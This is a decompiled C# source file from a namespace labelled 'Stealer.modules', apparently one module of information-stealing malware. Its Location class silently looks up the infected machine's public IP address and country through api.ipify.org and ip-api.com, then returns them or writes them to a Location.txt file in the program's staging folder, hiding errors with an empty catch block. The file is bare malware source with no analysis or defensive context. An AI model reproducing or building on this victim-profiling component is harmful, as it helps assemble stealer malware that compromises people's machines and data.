using System;
using System.IO;
using System.Net;
using System.Xml;

namespace Stealer.modules
{
	// Token: 0x02000032 RID: 50
	internal class Location
	{
		// Token: 0x06000103 RID: 259 RVA: 0x0000C4E8 File Offset: 0x0000A6E8
		public static string GetLocation(bool Param)
		{
			try
			{
				string str = Program.path + "\\";
				string str2 = new WebClient().DownloadString("https://api.ipify.org/");
				string address = "http://ip-api.com/xml";
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.LoadXml(new WebClient().DownloadString(address));
				string str3 = "[" + xmlDocument.GetElementsByTagName("countryCode")[0].InnerText + "]";
				if (Param)
				{
					return str3 + " | " + str2;
				}
				File.WriteAllText(str + "Location.txt", str3 + " | " + str2);
			}
			catch
			{
			}
			return "";
		}
	}
}
